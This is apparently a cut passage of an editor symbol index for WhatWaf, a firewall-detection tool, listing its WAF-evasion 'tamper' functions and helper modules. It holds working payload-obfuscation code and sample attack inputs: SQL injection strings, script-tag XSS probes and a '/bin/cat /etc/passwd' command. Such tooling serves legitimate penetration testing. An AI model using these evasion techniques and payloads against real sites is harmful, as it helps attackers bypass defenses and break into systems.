        "peekOfCode": "def tamper(payload, **kwargs):\n    wildcard = [\"*\", \"?\"]\n    safe_chars = string.punctuation + \" \"\n    retval = \"\"\n    for char in list(payload):\n        if not any(p == char for p in safe_chars):\n            do_it = random.randint(1, 10) <= 3\n            if do_it:\n                retval += random.choice(wildcard)\n            else:",
        "detail": "tools.whatwaf.content.tampers.randomwildcard",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.randomwildcard",
        "description": "tools.whatwaf.content.tampers.randomwildcard",
        "peekOfCode": "__example_payload__ = \"/bin/cat /etc/passwd\"\n__type__ = \"changing characters into a wildcard\"\ndef tamper(payload, **kwargs):\n    wildcard = [\"*\", \"?\"]\n    safe_chars = string.punctuation + \" \"\n    retval = \"\"\n    for char in list(payload):\n        if not any(p == char for p in safe_chars):\n            do_it = random.randint(1, 10) <= 3\n            if do_it:",
        "detail": "tools.whatwaf.content.tampers.randomwildcard",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.randomwildcard",
        "description": "tools.whatwaf.content.tampers.randomwildcard",
        "peekOfCode": "__type__ = \"changing characters into a wildcard\"\ndef tamper(payload, **kwargs):\n    wildcard = [\"*\", \"?\"]\n    safe_chars = string.punctuation + \" \"\n    retval = \"\"\n    for char in list(payload):\n        if not any(p == char for p in safe_chars):\n            do_it = random.randint(1, 10) <= 3\n            if do_it:\n                retval += random.choice(wildcard)",
        "detail": "tools.whatwaf.content.tampers.randomwildcard",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.space2comment",
        "description": "tools.whatwaf.content.tampers.space2comment",
        "peekOfCode": "def tamper(payload, **kwargs):\n    payload = str(payload)\n    retval = \"\"\n    for char in payload:\n        if char == \" \":\n            retval += \"/**/\"\n        else:\n            retval += char\n    return retval",
        "detail": "tools.whatwaf.content.tampers.space2comment",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.space2comment",
        "description": "tools.whatwaf.content.tampers.space2comment",
        "peekOfCode": "__example_payload__ = '484029\") AS xDKy WHERE 5427=5427 UNION ALL SELECT NULL,NULL'\n__type__ = \"changing the spaces in the payload into a comment\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    retval = \"\"\n    for char in payload:\n        if char == \" \":\n            retval += \"/**/\"\n        else:\n            retval += char",
        "detail": "tools.whatwaf.content.tampers.space2comment",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.space2comment",
        "description": "tools.whatwaf.content.tampers.space2comment",
        "peekOfCode": "__type__ = \"changing the spaces in the payload into a comment\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    retval = \"\"\n    for char in payload:\n        if char == \" \":\n            retval += \"/**/\"\n        else:\n            retval += char\n    return retval",
        "detail": "tools.whatwaf.content.tampers.space2comment",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.space2doubledash",
        "description": "tools.whatwaf.content.tampers.space2doubledash",
        "peekOfCode": "def tamper(payload, **kwargs):\n    modifier = \"--\"\n    retval = \"\"\n    for char in payload:\n        if char == \" \":\n            retval += modifier\n        else:\n            retval += char\n    return retval",
        "detail": "tools.whatwaf.content.tampers.space2doubledash",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.space2doubledash",
        "description": "tools.whatwaf.content.tampers.space2doubledash",
        "peekOfCode": "__example_payload__ = \"' AND 1=1 ORDERBY(1,2,3,4,5) '; asdf\"\n__type__ = \"changing the spaces in the payload into double dashes\"\ndef tamper(payload, **kwargs):\n    modifier = \"--\"\n    retval = \"\"\n    for char in payload:\n        if char == \" \":\n            retval += modifier\n        else:\n            retval += char",
        "detail": "tools.whatwaf.content.tampers.space2doubledash",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.space2doubledash",
        "description": "tools.whatwaf.content.tampers.space2doubledash",
        "peekOfCode": "__type__ = \"changing the spaces in the payload into double dashes\"\ndef tamper(payload, **kwargs):\n    modifier = \"--\"\n    retval = \"\"\n    for char in payload:\n        if char == \" \":\n            retval += modifier\n        else:\n            retval += char\n    return retval",
        "detail": "tools.whatwaf.content.tampers.space2doubledash",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.space2hash",
        "description": "tools.whatwaf.content.tampers.space2hash",
        "peekOfCode": "def tamper(payload, **kwargs):\n    modifier = \"%%23{}%%0A\".format(uuid.uuid4().hex[1:5])\n    retval = \"\"\n    for char in payload:\n        if char == \" \":\n            retval += modifier\n        else:\n            retval += char\n    return retval",
        "detail": "tools.whatwaf.content.tampers.space2hash",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.space2hash",
        "description": "tools.whatwaf.content.tampers.space2hash",
        "peekOfCode": "__example_payload__ = \"' AND 1=1 OR 2=2\"\n__type__ = \"changing the payload spaces to obfuscated hashes with a newline\"\ndef tamper(payload, **kwargs):\n    modifier = \"%%23{}%%0A\".format(uuid.uuid4().hex[1:5])\n    retval = \"\"\n    for char in payload:\n        if char == \" \":\n            retval += modifier\n        else:\n            retval += char",
        "detail": "tools.whatwaf.content.tampers.space2hash",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.space2hash",
        "description": "tools.whatwaf.content.tampers.space2hash",
        "peekOfCode": "__type__ = \"changing the payload spaces to obfuscated hashes with a newline\"\ndef tamper(payload, **kwargs):\n    modifier = \"%%23{}%%0A\".format(uuid.uuid4().hex[1:5])\n    retval = \"\"\n    for char in payload:\n        if char == \" \":\n            retval += modifier\n        else:\n            retval += char\n    return retval",
        "detail": "tools.whatwaf.content.tampers.space2hash",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.space2multicomment",
        "description": "tools.whatwaf.content.tampers.space2multicomment",
        "peekOfCode": "def tamper(payload, **kwargs):\n    modifiers = (\"/**/\", \"/**//**/\", \"/**//**//**/\")\n    retval = \"\"\n    for char in payload:\n        num = random.choice([1, 2, 3])\n        if char != \" \":\n            retval += char\n        if num == 1:\n            if char == \" \":\n                retval += modifiers[0]",
        "detail": "tools.whatwaf.content.tampers.space2multicomment",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.space2multicomment",
        "description": "tools.whatwaf.content.tampers.space2multicomment",
        "peekOfCode": "__example_payload__ = \"' AND 1=1 OR 9=10 ORDERBY(1,2,3,4,5)\"\n__type__ = \"change the payload spaces to a random amount of spaces obfuscated with a comment\"\ndef tamper(payload, **kwargs):\n    modifiers = (\"/**/\", \"/**//**/\", \"/**//**//**/\")\n    retval = \"\"\n    for char in payload:\n        num = random.choice([1, 2, 3])\n        if char != \" \":\n            retval += char\n        if num == 1:",
        "detail": "tools.whatwaf.content.tampers.space2multicomment",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.space2multicomment",
        "description": "tools.whatwaf.content.tampers.space2multicomment",
        "peekOfCode": "__type__ = \"change the payload spaces to a random amount of spaces obfuscated with a comment\"\ndef tamper(payload, **kwargs):\n    modifiers = (\"/**/\", \"/**//**/\", \"/**//**//**/\")\n    retval = \"\"\n    for char in payload:\n        num = random.choice([1, 2, 3])\n        if char != \" \":\n            retval += char\n        if num == 1:\n            if char == \" \":",
        "detail": "tools.whatwaf.content.tampers.space2multicomment",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.space2null",
        "description": "tools.whatwaf.content.tampers.space2null",
        "peekOfCode": "def tamper(payload, **kwargs):\n    modifier = \"%00\"\n    return str(payload).replace(\" \", modifier)",
        "detail": "tools.whatwaf.content.tampers.space2null",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.space2null",
        "description": "tools.whatwaf.content.tampers.space2null",
        "peekOfCode": "__example_payload__ = \"' AND 1=1 '\"\n__type__ = \"changing the spaces in the payload into a NULL character\"\ndef tamper(payload, **kwargs):\n    modifier = \"%00\"\n    return str(payload).replace(\" \", modifier)",
        "detail": "tools.whatwaf.content.tampers.space2null",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.space2null",
        "description": "tools.whatwaf.content.tampers.space2null",
        "peekOfCode": "__type__ = \"changing the spaces in the payload into a NULL character\"\ndef tamper(payload, **kwargs):\n    modifier = \"%00\"\n    return str(payload).replace(\" \", modifier)",
        "detail": "tools.whatwaf.content.tampers.space2null",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.space2plus",
        "description": "tools.whatwaf.content.tampers.space2plus",
        "peekOfCode": "def tamper(payload, **kwargs):\n    modifier = \"+\"\n    return str(payload).replace(\" \", modifier)",
        "detail": "tools.whatwaf.content.tampers.space2plus",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.space2plus",
        "description": "tools.whatwaf.content.tampers.space2plus",
        "peekOfCode": "__example_payload__ = \"' AND 1=1 '\"\n__type__ = \"changing the spaces in the payload into a plus sign\"\ndef tamper(payload, **kwargs):\n    modifier = \"+\"\n    return str(payload).replace(\" \", modifier)",
        "detail": "tools.whatwaf.content.tampers.space2plus",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.space2plus",
        "description": "tools.whatwaf.content.tampers.space2plus",
        "peekOfCode": "__type__ = \"changing the spaces in the payload into a plus sign\"\ndef tamper(payload, **kwargs):\n    modifier = \"+\"\n    return str(payload).replace(\" \", modifier)",
        "detail": "tools.whatwaf.content.tampers.space2plus",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.space2randomblank",
        "description": "tools.whatwaf.content.tampers.space2randomblank",
        "peekOfCode": "def tamper(payload, **kwargs):\n    blanks = (\"%09\", \"%0A\", \"%0C\", \"%0D\", \"%00\")\n    retval = \"\"\n    for char in payload:\n        modifier = random.choice(blanks)\n        if char == \" \":\n            retval += modifier\n        else:\n            retval += char\n    return retval",
        "detail": "tools.whatwaf.content.tampers.space2randomblank",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.space2randomblank",
        "description": "tools.whatwaf.content.tampers.space2randomblank",
        "peekOfCode": "__example_payload__ = \"' AND 1=1 OR 24=25 '\"\n__type__ = \"changing the payload spaces to random ASCII blank characters\"\ndef tamper(payload, **kwargs):\n    blanks = (\"%09\", \"%0A\", \"%0C\", \"%0D\", \"%00\")\n    retval = \"\"\n    for char in payload:\n        modifier = random.choice(blanks)\n        if char == \" \":\n            retval += modifier\n        else:",
        "detail": "tools.whatwaf.content.tampers.space2randomblank",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.space2randomblank",
        "description": "tools.whatwaf.content.tampers.space2randomblank",
        "peekOfCode": "__type__ = \"changing the payload spaces to random ASCII blank characters\"\ndef tamper(payload, **kwargs):\n    blanks = (\"%09\", \"%0A\", \"%0C\", \"%0D\", \"%00\")\n    retval = \"\"\n    for char in payload:\n        modifier = random.choice(blanks)\n        if char == \" \":\n            retval += modifier\n        else:\n            retval += char",
        "detail": "tools.whatwaf.content.tampers.space2randomblank",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.tabifyspacecommon",
        "description": "tools.whatwaf.content.tampers.tabifyspacecommon",
        "peekOfCode": "def tamper(payload, **kwargs):\n    return payload.replace(\" \", r\"\\t\")",
        "detail": "tools.whatwaf.content.tampers.tabifyspacecommon",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.tabifyspacecommon",
        "description": "tools.whatwaf.content.tampers.tabifyspacecommon",
        "peekOfCode": "__example_payload__ = \"SELECT * FROM information_schema.tables\"\n__type__ = \"replacing the payloads spaces with tab character (\\\\t)\"\ndef tamper(payload, **kwargs):\n    return payload.replace(\" \", r\"\\t\")",
        "detail": "tools.whatwaf.content.tampers.tabifyspacecommon",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.tabifyspacecommon",
        "description": "tools.whatwaf.content.tampers.tabifyspacecommon",
        "peekOfCode": "__type__ = \"replacing the payloads spaces with tab character (\\\\t)\"\ndef tamper(payload, **kwargs):\n    return payload.replace(\" \", r\"\\t\")",
        "detail": "tools.whatwaf.content.tampers.tabifyspacecommon",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.tabifyspaceuncommon",
        "description": "tools.whatwaf.content.tampers.tabifyspaceuncommon",
        "peekOfCode": "def tamper(payload, **kwargs):\n    return payload.replace(\" \", \"        \")",
        "detail": "tools.whatwaf.content.tampers.tabifyspaceuncommon",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.tabifyspaceuncommon",
        "description": "tools.whatwaf.content.tampers.tabifyspaceuncommon",
        "peekOfCode": "__example_payload__ = \"UNION SELECT * FROM users WHERE user = 'admin';\"\n__type__ = \"replacing the spaces in the payload with 8 spaces to simulate a tab character\"\ndef tamper(payload, **kwargs):\n    return payload.replace(\" \", \"        \")",
        "detail": "tools.whatwaf.content.tampers.tabifyspaceuncommon",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.tabifyspaceuncommon",
        "description": "tools.whatwaf.content.tampers.tabifyspaceuncommon",
        "peekOfCode": "__type__ = \"replacing the spaces in the payload with 8 spaces to simulate a tab character\"\ndef tamper(payload, **kwargs):\n    return payload.replace(\" \", \"        \")",
        "detail": "tools.whatwaf.content.tampers.tabifyspaceuncommon",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.tripleurlencode",
        "description": "tools.whatwaf.content.tampers.tripleurlencode",
        "peekOfCode": "def tamper(payload, **kwargs):\n    danger_chars = string.punctuation + \" \"\n    extra_danger_chars = (\"_\", \".\")\n    retval = \"\"\n    for char in list(payload):\n        if char not in danger_chars:\n            retval += char\n        elif char == extra_danger_chars[0]:\n            retval += quote_plus(\"%255F\")\n        elif char == extra_danger_chars[1]:",
        "detail": "tools.whatwaf.content.tampers.tripleurlencode",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.tripleurlencode",
        "description": "tools.whatwaf.content.tampers.tripleurlencode",
        "peekOfCode": "__example_payload__ = \"' AND 1=1;SELECT * FROM information_schema.tables '\"\n__type__ = \"triple URL encoding the payload characters\"\ndef tamper(payload, **kwargs):\n    danger_chars = string.punctuation + \" \"\n    extra_danger_chars = (\"_\", \".\")\n    retval = \"\"\n    for char in list(payload):\n        if char not in danger_chars:\n            retval += char\n        elif char == extra_danger_chars[0]:",
        "detail": "tools.whatwaf.content.tampers.tripleurlencode",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.tripleurlencode",
        "description": "tools.whatwaf.content.tampers.tripleurlencode",
        "peekOfCode": "__type__ = \"triple URL encoding the payload characters\"\ndef tamper(payload, **kwargs):\n    danger_chars = string.punctuation + \" \"\n    extra_danger_chars = (\"_\", \".\")\n    retval = \"\"\n    for char in list(payload):\n        if char not in danger_chars:\n            retval += char\n        elif char == extra_danger_chars[0]:\n            retval += quote_plus(\"%255F\")",
        "detail": "tools.whatwaf.content.tampers.tripleurlencode",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.uppercase",
        "description": "tools.whatwaf.content.tampers.uppercase",
        "peekOfCode": "def tamper(payload, **kwargs):\n    payload = str(payload)\n    return payload.upper()",
        "detail": "tools.whatwaf.content.tampers.uppercase",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.uppercase",
        "description": "tools.whatwaf.content.tampers.uppercase",
        "peekOfCode": "__example_payload__ = '<script>alert(\"test\");</script>'\n__type__ = \"changing the payload into its uppercase equivalent\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    return payload.upper()",
        "detail": "tools.whatwaf.content.tampers.uppercase",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.uppercase",
        "description": "tools.whatwaf.content.tampers.uppercase",
        "peekOfCode": "__type__ = \"changing the payload into its uppercase equivalent\"\ndef tamper(payload, **kwargs):\n    payload = str(payload)\n    return payload.upper()",
        "detail": "tools.whatwaf.content.tampers.uppercase",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.urlencode",
        "description": "tools.whatwaf.content.tampers.urlencode",
        "peekOfCode": "def tamper(payload, **kwargs):\n    to_encode = string.punctuation\n    retval = \"\"\n    if not any(s in payload for s in to_encode):\n        return payload\n    for char in payload:\n        if char in to_encode:\n            retval += \"%{}\".format(ord(char))\n        else:\n            retval += char",
        "detail": "tools.whatwaf.content.tampers.urlencode",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.urlencode",
        "description": "tools.whatwaf.content.tampers.urlencode",
        "peekOfCode": "__example_payload__ = \"<script>alert('test');</script>\"\n__type__ = \"encoding punctuation characters by their URL encoding equivalent\"\ndef tamper(payload, **kwargs):\n    to_encode = string.punctuation\n    retval = \"\"\n    if not any(s in payload for s in to_encode):\n        return payload\n    for char in payload:\n        if char in to_encode:\n            retval += \"%{}\".format(ord(char))",
        "detail": "tools.whatwaf.content.tampers.urlencode",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.urlencode",
        "description": "tools.whatwaf.content.tampers.urlencode",
        "peekOfCode": "__type__ = \"encoding punctuation characters by their URL encoding equivalent\"\ndef tamper(payload, **kwargs):\n    to_encode = string.punctuation\n    retval = \"\"\n    if not any(s in payload for s in to_encode):\n        return payload\n    for char in payload:\n        if char in to_encode:\n            retval += \"%{}\".format(ord(char))\n        else:",
        "detail": "tools.whatwaf.content.tampers.urlencode",
        "documentation": {}
    },
    {
        "label": "tamper",
        "kind": 2,
        "importPath": "tools.whatwaf.content.tampers.urlencodeall",
        "description": "tools.whatwaf.content.tampers.urlencodeall",
        "peekOfCode": "def tamper(payload, **kwargs):\n    retval = \"\"\n    for char in payload:\n        retval += \"%{}\".format(ord(char))\n    return retval",
        "detail": "tools.whatwaf.content.tampers.urlencodeall",
        "documentation": {}
    },
    {
        "label": "__example_payload__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.urlencodeall",
        "description": "tools.whatwaf.content.tampers.urlencodeall",
        "peekOfCode": "__example_payload__ = \"SELECT * FROM information_schema.tables\"\n__type__ = \"encoding all characters in the payload into their URL encoding equivalent\"\ndef tamper(payload, **kwargs):\n    retval = \"\"\n    for char in payload:\n        retval += \"%{}\".format(ord(char))\n    return retval",
        "detail": "tools.whatwaf.content.tampers.urlencodeall",
        "documentation": {}
    },
    {
        "label": "__type__",
        "kind": 5,
        "importPath": "tools.whatwaf.content.tampers.urlencodeall",
        "description": "tools.whatwaf.content.tampers.urlencodeall",
        "peekOfCode": "__type__ = \"encoding all characters in the payload into their URL encoding equivalent\"\ndef tamper(payload, **kwargs):\n    retval = \"\"\n    for char in payload:\n        retval += \"%{}\".format(ord(char))\n    return retval",
        "detail": "tools.whatwaf.content.tampers.urlencodeall",
        "documentation": {}
    },
    {
        "label": "StoreDictKeyPairs",
        "kind": 6,
        "importPath": "tools.whatwaf.lib.cmd",
        "description": "tools.whatwaf.lib.cmd",
        "peekOfCode": "class StoreDictKeyPairs(Action):\n    \"\"\"\n    custom action to create a dict from a provided string in the format of key=value or vey:value\n    \"\"\"\n    retval = {}\n    def __call__(self, parser, namespace, values, option_string=None):\n        # discover what we split by\n        for kv in values.split(\",\"):\n            if \":\" in kv:\n                splitter = \":\"",
        "detail": "tools.whatwaf.lib.cmd",
        "documentation": {}
    },
    {
        "label": "WhatWafParser",
        "kind": 6,
        "importPath": "tools.whatwaf.lib.cmd",
        "description": "tools.whatwaf.lib.cmd",
        "peekOfCode": "class WhatWafParser(ArgumentParser):\n    \"\"\"\n    our cool little class that is a child of argparse where we will\n    take all the data and arguments and return them into a single\n    class instance\n    \"\"\"\n    def __init__(self):\n        super(WhatWafParser, self).__init__()\n    @staticmethod\n    def cmd_parser():",
        "detail": "tools.whatwaf.lib.cmd",
        "documentation": {}
    },
    {
        "label": "initialize",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.database",
        "description": "tools.whatwaf.lib.database",
        "peekOfCode": "def initialize():\n    \"\"\"\n    initialize the database and the HOME directory (~/.whatwaf)\n    \"\"\"\n    if not os.path.exists(lib.settings.DATABASE_FILENAME):\n        # idk why but apparently i never created the directory :|\n        if not os.path.exists(lib.settings.HOME):\n            try:\n                os.makedirs(lib.settings.HOME)\n            except:",
        "detail": "tools.whatwaf.lib.database",
        "documentation": {}
    },
    {
        "label": "fetch_data",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.database",
        "description": "tools.whatwaf.lib.database",
        "peekOfCode": "def fetch_data(cursor, is_payload=True):\n    \"\"\"\n    fetch all payloads or URLs out of the database\n    \"\"\"\n    try:\n        if is_payload:\n            cached = cursor.execute(\"SELECT * FROM cached_payloads\")\n        else:\n            cached = cursor.execute(\"SELECT * FROM cached_urls\")\n        retval = cached.fetchall()",
        "detail": "tools.whatwaf.lib.database",
        "documentation": {}
    },
    {
        "label": "insert_payload",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.database",
        "description": "tools.whatwaf.lib.database",
        "peekOfCode": "def insert_payload(payload, cursor):\n    \"\"\"\n    insert a payload into the database\n    \"\"\"\n    try:\n        is_inserted = False\n        current_cache = fetch_data(cursor, is_payload=True)\n        id_number = len(current_cache) + 1\n        for item in current_cache:\n            _, cache_payload = item",
        "detail": "tools.whatwaf.lib.database",
        "documentation": {}
    },
    {
        "label": "insert_url",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.database",
        "description": "tools.whatwaf.lib.database",
        "peekOfCode": "def insert_url(netloc, working_tampers, identified_protections,  cursor, webserver=None, return_found=False):\n    \"\"\"\n    insert the URL into the database for future use, will only insert the netlock of the URL for easier\n    caching and quicker checking, so multiple netlocks of the same URL can hypothetically be used IE:\n     - www.foo.bar\n     - ftp.foo.bar\n     - ssh.foo.bar\n    \"\"\"\n    try:\n        is_inserted = False",
        "detail": "tools.whatwaf.lib.database",
        "documentation": {}
    },
    {
        "label": "create_identifier",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.firewall_found",
        "description": "tools.whatwaf.lib.firewall_found",
        "peekOfCode": "def create_identifier(data):\n    obj = hashlib.sha1()\n    try:\n        obj.update(data)\n    except:\n        obj.update(data.encode(\"utf-8\"))\n    return obj.hexdigest()[1:10]\ndef get_token(path):\n    \"\"\"\n    we know what this is for",
        "detail": "tools.whatwaf.lib.firewall_found",
        "documentation": {}
    },
    {
        "label": "get_token",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.firewall_found",
        "description": "tools.whatwaf.lib.firewall_found",
        "peekOfCode": "def get_token(path):\n    \"\"\"\n    we know what this is for\n    \"\"\"\n    with open(path) as _token:\n        data = _token.read()\n        token, n = data.split(\":\")\n        for _ in range(int(n)):\n            token = base64.b64decode(token)\n    return token",
        "detail": "tools.whatwaf.lib.firewall_found",
        "documentation": {}
    },
    {
        "label": "ensure_no_issue",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.firewall_found",
        "description": "tools.whatwaf.lib.firewall_found",
        "peekOfCode": "def ensure_no_issue(param):\n    \"\"\"\n    ensure that there is not already an issue that has been created for yours\n    \"\"\"\n    urls = (\n        \"https://github.com/Ekultek/WhatWaf/issues\",\n        \"https://github.com/Ekultek/WhatWaf/issues?q=is%3Aissue+is%3Aclosed\"\n    )\n    for url in urls:\n        req = requests.get(url)",
        "detail": "tools.whatwaf.lib.firewall_found",
        "documentation": {}
    },
    {
        "label": "find_url",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.firewall_found",
        "description": "tools.whatwaf.lib.firewall_found",
        "peekOfCode": "def find_url(params):\n    \"\"\"\n    get the URL that your issue is created at\n    \"\"\"\n    searches = (\n        \"https://github.com/Ekultek/WhatWaf/issues\",\n        \"https://github.com/Ekultek/WhatWaf/issues?q=is%3Aissue+is%3Aclosed\"\n    )\n    for search in searches:\n        retval = \"https://github.com{}\"",
        "detail": "tools.whatwaf.lib.firewall_found",
        "documentation": {}
    },
    {
        "label": "hide_sensitive",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.firewall_found",
        "description": "tools.whatwaf.lib.firewall_found",
        "peekOfCode": "def hide_sensitive(args, command):\n    \"\"\"\n    hide sensitive information out of the arguments\n    \"\"\"\n    try:\n        url_index = args.index(command) + 1\n        hidden_url = ''.join([x.replace(x, \"*\") for x in str(args[url_index])])\n        args.pop(url_index)\n        args.insert(url_index, hidden_url)\n        return ' '.join(args)",
        "detail": "tools.whatwaf.lib.firewall_found",
        "documentation": {}
    },
    {
        "label": "request_issue_creation",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.firewall_found",
        "description": "tools.whatwaf.lib.firewall_found",
        "peekOfCode": "def request_issue_creation(exception_details):\n    \"\"\"\n    create an issue instead of a firewall\n    \"\"\"\n    import platform\n    question = lib.formatter.prompt(\n        \"would you like to create an anonymized issue for the unhandled exception\", \"yN\"\n    )\n    if question.lower().startswith(\"y\"):\n        is_newest = lib.settings.check_version(speak=False)",
        "detail": "tools.whatwaf.lib.firewall_found",
        "documentation": {}
    },
    {
        "label": "request_firewall_issue_creation",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.firewall_found",
        "description": "tools.whatwaf.lib.firewall_found",
        "peekOfCode": "def request_firewall_issue_creation(path):\n    \"\"\"\n    request the creation and create the issue\n    \"\"\"\n    question = lib.formatter.prompt(\n        \"would you like to create an issue with the discovered unknown firewall to potentially \"\n        \"get a detection script created for it\", \"yN\"\n    )\n    if question.lower().startswith(\"y\"):\n        is_newest = lib.settings.check_version(speak=False)",
        "detail": "tools.whatwaf.lib.firewall_found",
        "documentation": {}
    },
    {
        "label": "set_color",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.formatter",
        "description": "tools.whatwaf.lib.formatter",
        "peekOfCode": "def set_color(string, level=None):\n    \"\"\"\n    set the string color\n    \"\"\"\n    color_levels = {\n        10: \"\\033[36m{}\\033[0m\",\n        15: \"\\033[1m\\033[32m{}\\033[0m\",\n        20: \"\\033[32m{}\\033[0m\",\n        30: \"\\033[1m\\033[33m{}\\033[0m\",\n        35: \"\\033[33m{}\\033[0m\",",
        "detail": "tools.whatwaf.lib.formatter",
        "documentation": {}
    },
    {
        "label": "info",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.formatter",
        "description": "tools.whatwaf.lib.formatter",
        "peekOfCode": "def info(string):\n    print(\n        \"\\033[38m[{}]\\033[0m\".format(time.strftime(\"%H:%M:%S\")) + set_color(\"[INFO] {}\".format(string), level=20)\n    )\ndef debug(string):\n    print(\n            \"\\033[38m[{}]\\033[0m\".format(time.strftime(\"%H:%M:%S\")) + set_color(\"[DEBUG] {}\".format(string), level=10)\n    )\ndef warn(string, minor=False):\n    if not minor:",
        "detail": "tools.whatwaf.lib.formatter",
        "documentation": {}
    },
    {
        "label": "debug",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.formatter",
        "description": "tools.whatwaf.lib.formatter",
        "peekOfCode": "def debug(string):\n    print(\n            \"\\033[38m[{}]\\033[0m\".format(time.strftime(\"%H:%M:%S\")) + set_color(\"[DEBUG] {}\".format(string), level=10)\n    )\ndef warn(string, minor=False):\n    if not minor:\n        print(\n                \"\\033[38m[{}]\\033[0m\".format(time.strftime(\"%H:%M:%S\")) + set_color(\"[WARN] {}\".format(string), level=30)\n        )\n    else:",
        "detail": "tools.whatwaf.lib.formatter",
        "documentation": {}
    },
    {
        "label": "warn",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.formatter",
        "description": "tools.whatwaf.lib.formatter",
        "peekOfCode": "def warn(string, minor=False):\n    if not minor:\n        print(\n                \"\\033[38m[{}]\\033[0m\".format(time.strftime(\"%H:%M:%S\")) + set_color(\"[WARN] {}\".format(string), level=30)\n        )\n    else:\n        print(\n                \"\\033[38m[{}]\\033[0m\".format(time.strftime(\"%H:%M:%S\")) + set_color(\"[WARN] {}\".format(string), level=35)\n        )\ndef error(string):",
        "detail": "tools.whatwaf.lib.formatter",
        "documentation": {}
    },
    {
        "label": "error",
        "kind": 2,
        "importPath": "tools.whatwaf.lib.formatter",
        "description": "tools.whatwaf.lib.formatter",
